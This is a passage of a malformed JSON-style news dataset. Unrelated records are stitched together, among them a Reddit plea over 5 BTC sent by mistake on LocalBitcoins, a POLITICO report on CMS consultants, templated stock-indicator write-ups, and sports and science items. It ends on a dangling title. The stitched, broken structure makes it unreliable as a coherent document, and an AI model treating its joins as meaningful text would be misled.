I am not trying to insult or negatively talk bad on your support. I am just trying to get this resolved QUICKLY with some answers as to why such a simple process is taking so long. \nYES - Im aware that it was a stupid mistake that could've been avoided had I double checked the addresses. But it happened and theres nothing I can do. I've been doing this for years and this is the first mistake I have ever made in this manner. \nI've been a trader on LBC for longer than 5 years with more than 1000 BTC traded and 100% feedback \nWhen I am not in my office I use a VNC to access my office computer via my laptop and conduct trades there as well. That is how the clipboard mishap came about. \nThe money that was accidentally sent was half of the payment for my wife's surgery. (No she is not dying but its a very time sensitive surgery that will push the date further back if not done ASAP) \n------------------------------------------------------------------------------------------------------------------------------------------------------------ \n\u200b \n04/05/2019 01:31 : I initiate a trade with LBC user that I've regularly traded with to buy amazon gift cards. Everything went perfect as normal and I sent bitcoin for the sale directly to his LBC wallet address. \n04/05/2019 11:11 : I accidentally sent 5 BTC to the address in my clipboard. On my desktop and not my laptop. And the addresses looked very similar (Which happened to be the customers LBC wallet that I traded with earlier) instead of my external address that I was meaning to send to. \n04/05/2019 11:14 a.m: I message the user that the BTC was accidentally sent to begging that he return it and I will reward him for being honest \n04/05/2019 11:24 a.m : I open a support ticket explaining to them what happened. \n04/05/2019 12:02 p.m : Support responds very quickly and freezes the money on his account (Thank you for the fast action LBC Support) \n04/05/2019 1:12 p.m : The person the money was accidentally sent to responds and says he will contact support and return BTC as well. In which is does contact them and they say they will proceed with returning the bitcoin to me. He also messages support twice to let them know it is my bitcoin and needs to be returned.(Thank God) \n04/05/2019 8:47 p.m : Support tells me they have started the return process but it could take weeks to get the bitcoin returned to me. \n04/06/2019, 2:04 p.m : The User who received the BTC is unable to pay his amazon code suppliers the money he owes due to his accounts being frozen. So in good faith I handle his debt to them directly. \n04/08/2019, 4:33 p.m : I contact support again to see if there is any update on the return of the BTC. (Received the same response) \n04/09/2019, 2:13 p.m .: I contact support yet AGAIN to ask for a timeframe of when I will receive. (No response yet) \n04/09/2019, 5:10 p.m : The user it was sent to sends me a screenshot of the btc still in his wallet unable to do anything either. \n---------------------------------------------------------------------------------------------------------------------------------------- \ntldr; I sent 5 BTC to the wrong address via LBC and the person who received is offering to send it back along with LBC freezing the funds. \nHowever, its been 4 days and it still has not been reversed and I am being told it can take weeks which makes no sense. \nNow the person who received them unintentionally, is unable to continue working because they have frozen his funds too and he just wants the BTC returned so he can continue working. \n------------------------------------------------------------------------------------------------------------------------------------------- \nSo my questions to you LBC Staff is: \n\u200b \nWhy is this taking so long to get reversed? \nIf anyone reading this works at LBC and can expedite this process please reach out? \n\u200b \nThanks \nsubmitted by /u/HelpmeLBC \n[link] [comments]",

      "text": "Tue, Mar 26, 2019 - 11:28 AM \nMAYBANK Kim Eng has downgraded its recommendation of mm2 Asia to \"hold\" as optimism over the performance of mm2-produced movie More Than Blue and another tie up with Fox Networks Group Asia has been priced in. \nOther than the rating change, the brokerage made no changes to forecasts as it awaits mm2 divisional disclosures in fiscal-year-end reporting. The target price is S$0.34. \nMore Than Blue is a Taiwanese remake of a 2009 South Korean film. While mm2 is not an investor in the film, the company usually takes producer bonus fees of 8 to 12 per cent from movies that have become box office hits. \nMaybank Kim Eng analyst Luis Hilado noted that by focusing on production instead of film investments, mm2's core production business is insulated from volatility. \nMoreover, long-term positives for the company are likely to surface as it builds a reputation as a hit-making producer. \nTherefore, mm2 should continue to bag future production work from regional or global players as evidenced by recent production deals with Netflix and Fox, Mr Hilado added. \nMaybank Kim Eng continues to view the media and entertainment player's content-production business favourably, which is supported by a healthy pipeline. \nThat said, there could be big-screen content risks due to changing viewer habits towards streaming platforms. Therefore, producing more content for such platforms could be essential to mm2, Maybank Kim Eng said. \nAnother downside risk to the brokerage's outlook is mm2's leverage due to its Cathay cinema acquisition deal in 2017. \n\"Unfortunately, its Cathay cinema acquisition has clouded all interim visibility of its production business and overall prospects due to leverage. \n\"Although upcoming fiscal-year results could provide visibility of all parts, this would be followed by a nine-month revenue fog unless management enhances interim disclosures.\"",

      "title": "Hack your networking: using empathy to make networking actually work",
      "text": "In the early days of building my first company, I went to as many networking events as possible. I operated like Jim Carrey in Yes Man and never said no. I thought I would go these events, eat the stale hors d\u2019oeuvres, sip the cheap chardonnay and put my card into as many hands as possible because increasing the odds was the only way to play this game. Fill that funnel and 10% will become clients. \nWithin my three-city radius I joined every merchant, chamber, networking and professionals group and in six months I gave out 1000 business cards. At one event, after my 20th double one-way conversation I was struck with the realization that everyone there was just like me\u200a\u2014\u200athere to promote their business and hand out their cards. We were all looking for business from each other, and we were all hungry (literally and metaphorically). \nI realized that I could reinvent my networking using empathy\u200a\u2014\u200aand I could make it work for others, too. So I did what any good researcher would do and started observing. Networking events were now research, and my prey became test subjects. \nFORGET SELLING \nHere\u2019s what I learned: those events will probably not bring you business. If everyone is there to sell, and none of the businesses are complimentary (e.g. B2B where you could service each other\u2019s businesses) then the event is probably not a good platform for selling. I realized that most of the events I was attending were full of realtors, commercial service providers, and dentists (like, a lot of dentists. It was weird.) I wasn\u2019t in the market for a new house, garage door, landscaping or root canal\u200a\u2014\u200aand those businesses weren\u2019t in the market for product strategy or UX or anything else I can offer. And the food wasn\u2019t that good, so there was really no reason for me to be there. \nFOCUS ON MEANINGFUL INTERACTIONS \nAre you at an industry event? Could you potentially help each other find work or business later? Then you are more at a true networking event (as in: time to build your network), and you should pivot from sales mode to relationship building mode. Approach it differently. Instead of selling your business and services, seek to learn more about what people do. Forget about you for a minute. \nInstead, seek to find out as much as you can about everyone else in the room. Try to find out their goals and needs. If you do this in a room full of at least 15 people, I guarantee you will spot two people who could benefit from meeting. Your new job is to connect them. By connecting them, you connect yourself with both of them. You\u2019re also doing a good deed without expecting anything in return, and as we\u2019ve learned the universe looks fondly upon that (also\u2014 please don\u2019t ask for a referral fee. This makes you a douchebag.) \nLearn how to approach strangers. \nI\u2019m an extrovert (O RLY?) and I\u2019ve never had a problem being alone in a room full of strangers. But once I stepped outside of myself and started empathizing with the other people at these events, I realized many people are not like me. They have a hard time showing up alone and starting conversations with strangers. Here is another great opportunity to help someone else: spot the wallflower and help get them integrated. Find someone who\u2019s even more uncomfortable than you and walk up to them and just start talking. Introduce yourself. Then make it all about them. \nAnd what if you\u2019re the wallflower? There are creative ways to fight anxiety and strike up a conversation. You can volunteer with event hosts to take photos, tend bar, take raffle tickets, or just help organize the event\u200a\u2014\u200aall great segues for the socially awkward to be forced into interacting. \nWhat else can you do? \nThink networking is awful and a complete waste of time? Then use your creative powers and create a new type of networking. What is a creative way relevant to your desired network that brings a group of people together for discussion and potential collaboration? What does your desired audience need? How can you provide it to them? Flex your empathy muscles and think of others for a change, OK?! \nhttps://medium.com/media/a19f46680bac3cbdc42953c920d0c104/href \nHack your networking: using empathy to make networking actually work was originally published in UX Collective on Medium, where people are continuing the conversation by highlighting and responding to this story.",

      "text": "Last week, the co-owner of the White Banana Beach Club made waves by drawing a line in the sand at his surfer outpost on Siargao in the Philippines. In a Facebook post , Gianluca Casaccia called out influencers who were flooding his inbox with requests for free rooms, free food, and free drinks in exchange for posting location-tagged, lust-worthy, FOMO-inducing photos on Instagram. \n\u201cWe kindly would like to announce that White Banana is not interested to \u2018collaborate\u2019 with self-proclaimed \u2018influencers,'\u201d Casaccia wrote. \u201cAnd we would like to suggest to try another way to eat, drink, or sleep for free. Or try to actually work.\u201d \nThe post went viral as people around the globe applauded the effort, or scoffed at someone peddling influence with fewer than 2,000 followers, which the self-proclaimed influencer mentioned in the request that pushed Casaccia over the edge. Later, Casaccia clarified that he wasn\u2019t opposed to influencers in general, but is actually \u201cagainst freeloaders.\u201d \u201cThere are real influencers,\u201d he wrote in a follow-up post. \u201cWe will contact them and pay or offer something. But look, they\u2019ve never contacted us, as they don\u2019t need us. We need them.\u201d In an interview with The New York Times , Casaccia defined a real influencer as someone with around \u201chalf a million followers.\u201d \nThis just the latest chapter in a growing battle. The first well-publicized sally came in January 2018, when the owner of Dublin\u2019s White Moose Caf\u00e9 got in a fight with Elle Darby, a U.K.-based influencer with a substantial group of followers on both YouTube and Instagram. The caf\u00e9 ended up banning influencers from staying at its establishment, making the case for its decision in a Facebook post. Meanwhile, the Ace Hotel chain in the Pacific Northwest has been so overwhelmed with influencer requests that it created a standardized online form to process them. \nThey\u2019re not all freeloaders \nLast year, The Atlantic reported that resorts in the Maldives and other desirable destinations are swamped with influencer inquiries, with people offering to exchange 10 days at a five-star resort in the Maldives for \u201ctwo posts on Instagram to like 2,000 followers.\u201d That said, when I was in the Maldives last year (what? I\u2019m fancy), I met several influencers who had been invited by the hotel. They were extremely professional, had many followers to influence, had high engagement with their followers, and the photogenic results of their quid pro quo arrangement are still being meted out months later. That\u2019s the sort of influencer hotels want, but not always the kind they get. \nStill, as one influencer commented on the White Banana Beach Club\u2019s post, it doesn\u2019t hurt to ask. A hotel in a far-flung destination might want an influencer staying with them, even if they have only 2,000 followers, just to get a slice of the all-important attention economy. \nThe White Banana Beach Club didn\u2019t make lemonade out of its influencer lemons, but it did make a new cocktail, called, naturally, \u201c The Influencer .\u201d I\u2019m guessing it is sweet upfront, but with an undercurrent of bitterness, and is 100% Instagram-friendly.",

      "text": "Exclusive: Key Trump health official spends millions on GOP-connected consultants \nSeema Verma employs a team of private consultants who write her speeches, polish her brand and travel with her across the country. \n03/29/2019 05:03 AM EDT \nUpdated 03/29/2019 10:34 AM EDT \nFri Mar 29 10:34:08 EDT 2019 \nThe Trump appointee who oversees Medicare, Medicaid and Obamacare quietly directed millions of taxpayer dollars in contracts to Republican communications consultants during her tenure atop the agency \u2014 including hiring one well-connected GOP media adviser to bolster her public profile. \nThe communications subcontracts approved by CMS Administrator Seema Verma \u2014 routed through a larger federal contract and described to POLITICO by three individuals with firsthand knowledge of the agreements \u2014 represent a sharp break from precedent at the agency. Those deals, managed by Verma\u2019s deputies, came in some cases over the objections of CMS staffers, who raised concerns about her push to use federal funds on GOP consultants and to amplify coverage of Verma\u2019s own work. CMS has its own large communications shop, including about two dozen people who handle the press. \nStory Continued Below \nVerma, a close ally of Vice President Mike Pence, has become a lightning rod for pushing work requirements in Medicaid and spearheading the Trump administration\u2019s efforts to unilaterally unwind pieces of Obamacare. She previously worked as a consultant to conservative states seeking to reshape health care programs for the poor. \nHer agency\u2019s use of outside contracts and subcontracts is legal, but experts and current officials say it is not transparent and raises ethical questions. \n\u201cOutsourcing communications work to private contractors puts the agency's ability to protect \u2018potentially market-moving\u2019 information from premature disclosure at considerable risk,\u201d said Andy Schneider, a Medicaid expert who worked at CMS during the Obama administration and is now a researcher at Georgetown University. \nAnd whether the issue was Medicare, Medicaid or Obamacare, prior heads of the agency were often quoted, profiled and in the news, so current officials said they\u2019re puzzled why so much work is being outsourced. \n\u201cThe head of Obamacare doesn't need outside consultants to get reporters to talk to her,\u201d said one CMS official, who asked for anonymity. \u201cThe job pitches itself.\u201d \nThe subcontracts are part of a $2.25 million contract administered by Porter Novelli, an international public relations firm that performs a wide variety of government services. CMS\u2019 new top communications official Tom Corry confirmed the arrangement. Two other individuals said CMS also spent at least $1 million on earlier contracts with GOP communications consultants. \nOne subcontract is with Pam Stevens, a longtime GOP media adviser who specializes in setting up profiles of Republican women. A second subcontract is with Marcus Barlow, whom Verma worked with in Indiana and considered hiring as a top communications official in 2017 before he was blocked by the White House. \nAs contractors, Stevens and Barlow are paid between $185 and $200 per hour, said two individuals with knowledge of their contracts \u2014 a far higher pay rate than the majority of high-level government officials. \nA third contract is with Nahigian Strategies, a firm run by a high-profile pair of brothers. Keith Nahigian consulted with several GOP presidential campaigns; Ken Nahigian briefly led President Donald Trump\u2019s presidential transition team in 2017. Nahigian Strategies staff have supported and advised Verma on messaging strategy for nearly two years, including accompanying Verma to Denver on Tuesday for meetings with digital health experts and CMS staff. One individual familiar with the relationship said Nahigian Strategies was paid at least $2 million for its work with CMS over the past two years. \nStevens, Nahigian Strategies and Porter Novelli referred questions to CMS. Barlow declined to comment for this article. \nOn Friday, House Energy and Commerce Chairman Frank Pallone called for an HHS inspector general probe into CMS\u2019 use of communications consultants, calling it a \u201chighly questionable use of taxpayer dollars.\u201d \n\u201cI intend to ask the HHS OIG to immediately begin an investigation into how these contracts were approved, whether all regulations and ethical guidelines were followed, and why taxpayers are stuck paying for these unnecessary services,\u201d the New Jersey Democrat said in a statement. \nIn an earlier interview with POLITICO , Verma\u2019s newly installed communications director Corry couldn\u2019t specify how much CMS had spent on GOP communications consultants, but stressed that he planned to cut them back now that the agency had personnel in place \u2014 after a slow start early in the Trump administration. \n\u201cNow that we\u2019re fully staffed up, contractor resources are going to be used less than they were,\u201d said Corry, who ran a health care consulting firm before joining CMS on March 4 to head its 200-person communications office. Their work includes running consumer-facing websites. \n\u201cWe use our resources judiciously,\u201d Corry said. \u201cWe\u2019re not wasting the taxpayer dollar.\u201d \nWhile Corry said he wasn\u2019t sure about overall spending on communications consultants, \u201cit\u2019s a small number compared to all the contracts we have,\u201d he said. \nFederal agencies are not required to proactively disclose arrangements with subcontractors, or even that those subcontractors exist \u2014 a gray area that gives them broad leeway to bring on individuals and outside firms under the cover of vague public contracts. For instance, public spending records describe the Porter Novelli contract simply as \u201cstrategic communications.\u201d \nBut some career CMS staff have voiced their concerns to political appointees within the agency about routing taxpayer dollars to GOP consultants and helping a federal official like Verma improve her personal brand, said two individuals aware of those conversations. Oversight groups also have raised concerns, saying the behavior, as described to them by POLITICO, would appear to cross ethical lines. \n\"There are a host of ethical and contractual problems with appointees steering contracts to political allies and subcontractors, and possibly a violation of the ban on personal services contracts if the work is being performed at the direction of the appointee,\u201d Scott Amey, general counsel of the Project on Government Oversight, told POLITICO. \u201cContracts are supposed to be above reproach, with complete impartiality, and without preferential treatment, and the HHS Inspector General should review this [Porter Novelli] contract and the activities under it to ensure they are proper.\" \nIn her two years leading CMS, Verma has drawn attention for regularly criticizing Obamacare \u2014 a law she administers \u2014 as well as trading Twitter barbs with Democratic lawmakers and mocking progressive ideas like \u201cMedicare for All.\u201d She also has battled with health experts, including the committee created to advise Congress on Medicaid, which broadly has warned the administration\u2019s push to shrink government health programs will reverse coverage gains made under Obamacare. \nVerma recently completed several interviews, arranged by Stevens, that focused on emphasizing her personal life and her role as a prominent Republican woman. The cover profile in this month\u2019s AARP bulletin , which went to more than 24 million people, included a sidebar on Verma\u2019s husband\u2019s experience in the health system. \nConsultants help shape CMS strategy \nBefore the Trump administration, communications consultants were used mostly for sweeping agency priorities, like raising awareness of Medicare open enrollment or encouraging sign-ups for the Affordable Care Act, five current and former officials said. \nCMS\u2019 current use of communications contractors has gone well beyond the norm, those five sources said, and comes at a time when Verma has made cuts elsewhere, such as reducing advertising for Obamacare enrollment by tens of millions of dollars. The outside consultants frequently handled Verma\u2019s media calls, joined her on promotional trips and wrote her speeches. \nThose functions historically were performed by career civil servants in the CMS Communications Office. \n\"We have no idea who some of these people are and why they're in meetings with the administrator,\" said one senior CMS official, who asked for anonymity. \"They're not introduced \u2026 It's become a guessing game for us.\" \nThe GOP consultants also brought a political edge to the agency\u2019s communications. \nIn a February 2018 incident, contractor Brett O'Donnell barred a Modern Healthcare reporter from a media call for refusing to alter a story that had rankled Verma. CMS officials walked back that threat within days and said a week later that Porter Novelli\u2019s subcontract with O\u2019Donnell, a longtime GOP consultant , would not be renewed. But CMS never provided any explanation of O\u2019Donnell\u2019s role or responsibilities. O\u2019Donnell declined to comment for this article. \nCorry said Porter Novelli handled finding consultants including O\u2019Donnell, Barlow and Stevens and the finer details of their contracts. \u201cWe have no idea what they\u2019re paid per hour,\u201d he said. \nStevens \u2014 a former Condoleezza Rice aide who did two short stints in the Trump administration in 2017 \u2014 pitched Verma to media outlets like Fox News, CBS and NBC, as well as for events hosted by the Milken Institute and other organizations. Widely known for her extensive Rolodex, Stevens generally has avoided the health journalists who regularly cover CMS in favor of brokering conversations with media executives or lifestyle reporters, and shepherding Verma to after-hours networking events with prominent journalists. \nShe also came to CMS with a reputation for securing flattering profiles of Republican women, an effort she developed as a House GOP strategist and continues to cultivate as a consultant. \u201cProud to have made this great piece happen,\u201d she posted on Facebook on Feb. 20, linking to a Glamour magazine article about Rep. Elise Stefanik \u2019s (R-N.Y.) effort to recruit more Republican women to Congress. \nStevens has played a similar role securing opportunities for Verma to showcase her work within the administration. In recent weeks, her outreach led to Verma\u2019s appearance on POLITICO\u2019s \u201cWomen Rule\u201d podcast, which profiles women leaders, and she worked on Verma\u2019s appearance on a panel hosted by Woman\u2019s Day magazine. (Verma\u2019s interview at a POLITICO policy event last July predated Stevens\u2019 involvement with CMS.) \nCMS\u2019 Corry said Stevens was used to book interviews for Verma but is being phased out. \u201cHer time is getting less and less anyway,\u201d he said. Corry also noted that he has his own network after 25 years in the field, including being friendly with the editor of The Wall Street Journal\u2019s opinion section and other reporters, and could fill Stevens\u2019 role. \nNahigian Strategies, a GOP-aligned public relations firm, has managed a wide variety of CMS communications functions for nearly two years. Its consultants have set up meetings and accompanied Verma around the nation to promote her key projects, like a March 2018 trip to a Las Vegas health technology conference to unveil Verma\u2019s digital health initiatives aimed at giving patients easier access to their own medical records. \n\u201cCheck out this op-ed placed in Recode on how the @RealDonaldTrump admin is leading in giving patients their health info,\u201d the Nahigian Strategies Twitter account posted a week after the Las Vegas trip. \nCMS\u2019 Corry said the Nahigian Strategies team helped Verma with travel, planning and other logistical issues. \u201cIt\u2019s pretty basic stuff,\u201d he said. \nVerma also relied on subcontracting to bring aboard longtime associate Barlow \u2014 after the White House blocked him from a permanent job leading CMS communications. Barlow, who served as a spokesperson for Verma's health care consulting firm in Indiana, had run afoul of the White House for writing a column critical of Trump, POLITICO reported at the time. \nNahigian Strategies hired Barlow instead in March 2017, which helped the firm strengthen its relationship with Verma. When Barlow left Nahigian Strategies in August 2018 to return to his own consulting firm, he continued to work for CMS under a separate subcontract that remains in effect, according to two individuals with knowledge of the arrangement. \nBarlow helped write some of Verma\u2019s most high-profile speeches, including a November 2017 address in which she signaled the Trump administration\u2019s plan to require some Medicaid enrollees to work to keep their coverage for the first time \u2014 a controversial policy that a federal judge blocked for the second time on Wednesday. \n\u201cBelieving that community engagement requirements do not support or promote the objectives of Medicaid is a tragic example of the soft bigotry of low expectations consistently espoused by the prior administration,\u201d Verma said in the speech that Barlow helped write. \u201cThose days are over.\u201d \nAdvocates panned Verma\u2019s remarks, contending she misrepresented the patients that she was appointed to serve. The speech \u201cwas rife with offensive rhetoric about the Medicaid program and individuals enrolled in it,\u201d the National Women\u2019s Law Center said . \nVerma\u2019s remarks also stunned Schneider, the former Obama appointee \u2014 who called them \u201c reprehensible \u201d at the time. But Schneider said he\u2019s more surprised to learn that Verma and her staff don\u2019t always write their own speeches, like CMS did when he worked there in 2016. \n\"I actually thought that her [Medicaid] speech was in her own voice,\" he said.",

      "text": "There are various types of investment philosophies that investors may choose to follow when approaching the stock market. Value investing involves searching for undervalued or bargain stocks that may eventually offer solid returns. Growth investors often buy companies that have highly promising growth potential. Some investors will choose to invest with a contrarian approach. This entails making investment decisions that are opposite of what the majority are doing, such as buying when everyone else is selling and vice-versa. Socially responsible investors may be searching for companies that subscribe to a high level of ethical or moral standards. \nThe Awesome Oscillator reading is currently -1.7220147 for China Mobile Limited (NYSE:CHL) . Technical traders will watch the AO especially when it crosses above or below the zero line. A move above the line may signal a bullish scenario. A move below the zero line may indicate a bearish selling opportunity. The AO may prove to be a valuable tool for many momentum traders. \nTraders will take note of the 20 day Chaikin Money Flow indicator that is now at -0.077459894 on shares of China Mobile Limited (NYSE:CHL) . The value of this indicator will fluctuate between 1 and -1. Traders may be watching when the CMF crosses zero. This cross might point to a bullish or bearish price reversal depending on which way it is moving crossing the zero line. \nTaking a look at the Donchian Channels indicator, we note that the 20 day lower band is 50.77. The 20 day upper band is 55.84. This indicator was created by Richard Donchian, and traders follow these channels to help identify potential trading signals. \nTechnical traders have many tools at their disposal when conducting stock research. One of those tools is the Exponential Moving Average or EMA. The EMA is similar to the simple moving average, but more weight is put on the newest data. Let\u2019s look at some different EMA levels: \n10 day Exponential Moving Average: 51.62618 \n20 day Exponential Moving Average: 52.242317 \n30 day Exponential Moving Average: 52.52268 \n50 day Exponential Moving Average: 52.655552 \n100 day Exponential Moving Average: 52.23249 \n200 day Exponential Moving Average: 51.077232 \nFollowing trading action on shares of China Mobile Limited (NYSE:CHL), we see that the stock has moved -0.01 since the opening price of 51.01. So far, the stock has reached a high of 51.08 and dipped to a low of 50.965. The consensus rating on the stock is currently Sell, and today\u2019s volume has been measured around 21938. \nThere are a number of different pivot points that traders can use when conducting stock analysis. Pivot points can be useful for traders looking to establish trading entry and exit points. Focusing on some popular one month pivots, we see that the Woodie pivot is currently at 52.7875. The Woodie support 1 pivot is 49.735, and the Woodie resistance 1 pivot is 53.885. The Camarilla one month pivot is presently 53.14. The one month Classic pivot is 53.14 and the Classic resistance 1 is 54.59 while the Classic support 1 pivot is measured at 50.44. \nTracking some stock ratings, we can see that the stock\u2019s Moving Average Rating is currently pointing to a \u201cStrong Sell\u201d. Traders may be monitoring many different indicators in order to get a grasp of where the stock may be moving in the near future. Taking a look at the Oscillators rating, we note that the reading is pointing to a \u201cSell\u201d. \nWhen it comes to investing, overconfidence can be detrimental to securing profits in the stock market. When investors have some early short-term wins, this may lead them to believe that it is their skill and superior knowledge that produced the winners. All though this may occasionally be the case, investors may quickly realize that it is very hard to consistently produce winning results. Sometimes a few wins can lead the investor to believe that they can make any trade work. This may create a situation where the individual gets in much deeper than they should have. Conducting the proper stock research before any trade can help the investor make sure that they are getting into a position for the right reasons.",

      "text": "Tyler Kaufman/Associated Press \nThe Los Angeles Lakers need to get LeBron James help this offseason, but free agency may not be the best path to achieve that goal. \n\"It's not a good year for the Lakers to be in the free-agent market, to be honest with you,\" ESPN's Brian Windhorst said on The Jump Thursday. \nNow, that could be the case for a lot of reasons. A number of teams, for one, are going to have cap space as they pursue stars like Kevin Durant , Kyrie Irving , Kawhi Leonard, Klay Thompson, Jimmy Butler, Tobias Harris and DeMarcus Cousins . The New York Knicks and Los Angeles Clippers , among others, are expected to make a splash. \nIt's also possible that many of these players will simply return to their current teams. It's hard to imagine Thompson wearing a different uniform. Harris feels like a natural fit in Philly with Joel Embiid and Ben Simmons. Rumors continue to circulate around Leonard landing with the Clippers, or Irving and Durant pairing up with the Knicks. \nIf James wants to add a superstar this offseason, it may come down to the Lakers pulling off a blockbuster trade. Maybe they can finally land Anthony Davis or make a play for Bradley Beal. But free agency may not be the answer.",

      "title": "Scientists drill into white graphene to create artificial atoms: Patterned on a microchip and working in ambient conditions, the atoms could lead to rapid advancements in new quantum-based technology",
      "text": "By drilling holes into a thin two-dimensional sheet of hexagonal boron nitride with a gallium-focused ion beam, University of Oregon scientists have created artificial atoms that generate single photons. \nThe artificial atoms -- which work in air and at room temperature -- may be a big step in efforts to develop all-optical quantum computing, said UO physicist Benjam\u00edn J. Alem\u00e1n, principal investigator of a study published in the journal Nano Letters . \n\"Our work provides a source of single photons that could act as carriers of quantum information or as qubits. We've patterned these sources, creating as many as we want, where we want,\" said Alem\u00e1n, a member of the UO's Material Science Institute and Center for Optical, Molecular, and Quantum Science. \"We'd like to pattern these single photon emitters into circuits or networks on a microchip so they can talk to each other, or to other existing qubits, like solid-state spins or superconducting circuit qubits.\" \nArtificial atoms were discovered three years ago in flakes of 2D hexagonal boron nitride, a single insulating layer of alternating boron and nitrogen atoms in a lattice that is also known as white graphene. Alem\u00e1n is among numerous researchers who are using that discovery to produce and use photons as sources of single photons and qubits in quantum photonic circuits. \nTraditional approaches for using atoms in quantum research have focused on capturing atoms or ions, and manipulating their spin with lasers so they exhibit quantum superposition, or the ability to be in a simultaneous combination of \"off\" and \"on\" states. But such work has required working in vacuum in extremely cold temperatures with sophisticated equipment. \nMotivated by the observation that artificial atoms are frequently found near an edge, Alem\u00e1n's team, supported by the National Science Foundation, first created edges in the white graphene by drilling circles 500 nanometers wide and four nanometers deep. \nThe devices were then annealed in oxygen at 850 degrees Celsius (1,562 degrees Fahrenheit) to remove carbon and other residual material and to activate the emitters. Confocal microscopy revealed tiny spots of light coming from the drilled regions. Zooming in, Alem\u00e1n's team saw that the individual bright spots were emitting light at the lowest possible level -- a single photon at a time. \nThe individual photons conceivably could be used as tiny, ultra-sensitive thermometers, in quantum key distribution, or to transfer, store and process quantum information, Alem\u00e1n said. \n\"The big breakthrough is that we've discovered a simple, scalable way to nanofabricate artificial atoms onto a microchip, and that the artificial atoms work in air and at room temperature,\" Alem\u00e1n said. \"Our artificial atoms will enable lots of new and powerful technologies. In the future, they could be used for safer, more secure, totally private communications, and much more powerful computers that could design life-saving drugs and help scientists gain a deeper understanding of the universe through quantum computation.\" \nStory Source: \nMaterials provided by University of Oregon .

      "title": "Yankees News: Dellin Betances to Miss at Least 6-7 Weeks with Shoulder Injury",
      "text": "Charles Krupa/Associated Press \nNew York Yankees relief pitcher Dellin Betances is expected to miss at least six to seven weeks as the result of a cortisone shot used to treat a spur in the back of his shoulder, according to Joel Sherman of the New York Post . \nBetances will be shut down from throwing for three weeks. \nBetances has yet to appear in a regular-season game this year, opening the season on the injured list with a right shoulder impingement . Sherman noted Betances threw a simulated game that did not go well Friday and subsequently underwent an MRI. \nDecreased velocity exhibited during spring training raised concerns. Per Bryan Hoch of MLB .com, Betances threw \" between 88 and 91 mph in his spring debut.\" \nLast season, Betances averaged 97.8 mph on his fastball velocity, per FanGraphs . \nWhen healthy, the four-time All-Star is a dominant strikeout artist who has punched out 40 percent of the batters he's faced in the bigs, per FanGraphs . He's the only reliever in MLB history to have struck out 100 or more batters in five straight years. \nThe 6'8\", 265-pound right-hander has been a fantastic member of the Yankees' bullpen dating back to 2014, when he became a fixture on the relief staff after making cups of coffee in 2011 and 2013. He has shown some on-and-off troubles with his command (16.9 percent walk rate in 2017 and 12.1 percent in 2015), but those issues have since dissipated. \nHe's also moonlit as the team's closer, making 36 career saves. However, he's largely operated as the back end of the bridge between starter and closer. Lately, he's primarily worked as the team's eighth-inning reliever ahead of closer Aroldis Chapman. \nLosing Betances would be a massive loss for most other bullpens, but the Yankees have one of MLB's best relief staffs. \nExpect manager Aaron Boone to use a mix of right-handers Adam Ottavino and Chad Green and left-hander Zach Britton to take care of the eighth inning with Betances out. Ottavino has a 1.29 ERA, while Green and Britton sit at 9.00 and 4.76, respectively. \nThe 5-8 Yankees are currently second in the American League East, 5.5 games back of the Tampa Bay Rays .",

      "title": "Korea Electric Power Corp (KEP) Stochastic MI Reading Touches Key Levels",
      "text": "Investors are delving into the details on shares of Korea Electric Power Corp (KEP). The share price has felt recent pressure moving past the Stochtastic Momentum Index of -40, indicating possible oversold territory. \nThe Stochastic Momentum Index, or SMI, is a more refined version of the original stochastic oscillator, employing a wider range of values and having a higher sensitivity to closing prices. The Stochastic Momentum Index (SMI) indicator was developed by William Blau and is based on the Stochastic indicator. The Stochastic oscillator is calculated using the close price relative to the high low trading range, whereas the Stochastic Momentum Index indicator is calculated using the close price relative to the midpoint of the high low trading range. The most common method of using SMI is to look for buy trades when the SMI falls under -40 and then rises back above through -40. Sell trades are looked for when the SMI rises above +40 and then falls back below +40. \nInvestors might be looking at various types of stocks that can be added to the portfolio. Selecting a wider range of equities may help the portfolio withstand prolonged market turmoil. Growth stocks typically have the potential to produce profit growth and above average revenues. Growth companies may reinvest a large amount of earnings back into the business. Fast growing companies can be attractive, but it may be important to verify whether or not shares are valued properly before buying in. Some investors may choose to select cyclical stocks. Cyclicals include companies that are very sensitive to the overall swings of the economy. Investors might also turn to adding foreign stocks to the portfolio. Keeping the portfolio diversified may end up being an important factor for longer-term investing success. \nCurrently, Korea Electric Power Corp (KEP)\u2019s Williams Percent Range or 14 day Williams %R is resting at -93.95. Values can range from 0 to -100. A reading between -80 to -100 may be typically viewed as strong oversold territory. A value between 0 to -20 would represent a strong overbought condition. As a momentum indicator, the Williams R% may be used with other technicals to help define a specific trend. \nKorea Electric Power Corp (KEP) presently has a 14-day Commodity Channel Index (CCI) of -77.09. Typically, the CCI oscillates above and below a zero line. Normal oscillations tend to stay in the range of -100 to +100. A CCI reading of +100 may represent overbought conditions, while readings near -100 may indicate oversold territory. Although the CCI indicator was developed for commodities, it has become a popular tool for equity evaluation as well. Checking on another technical indicator, the 14-day RSI is currently sitting at 27.99, the 7-day rests at 22.23, and the 3-day is presently at 28.27 for Korea Electric Power Corp (KEP). \nThe Relative Strength Index (RSI) is a highly popular technical indicator. The RSI is computed base on the speed and direction of a stock\u2019s price movement. The RSI is considered to be an internal strength indicator, not to be confused with relative strength which is compared to other stocks and indices. The RSI value will always move between 0 and 100. One of the most popular time frames using RSI is the 14-day. \nMoving average indicators are commonly tracked by technical stock analysts. Many traders will use a combination of moving averages with multiple time periods to help spot stock trend direction. One of the more popular combinations is to use the 50-day and 200-day moving averages. Investors may use the 200-day MA to help smooth out the data a get a clearer long-term picture. They may look to the 50-day or 20-day to get a better grasp of what is going on with the stock in the near-term. Presently, the 200-day moving average is at 13.80, and the 50-day is 14.73. The 14-day ADX for Korea Electric Power Corp (KEP) is standing at 36.82. Many chart analysts believe that an ADX reading over 25 would suggest a strong trend. A reading under 20 would suggest no trend, and a reading from 20-25 would suggest that there is no clear trend signal. \nFiguring out when to exit a certain position can be just as important as deciding which stocks to buy in the first place. Many investors will end up holding onto a loser for far too long. The emotional attachment to a particular stock may keep the investor from making the decision to sell when necessary. On the other side of the coin, investors may hold onto a winner for way too long hoping for further gains. Investors may have to come up with a specific plan for what to do in these situations. Planning ahead may help ease the burden of making the tough portfolio decisions.",

      "title": "Apple Card is reportedly approving customers with low credit scores to cast as wide a net as possible",
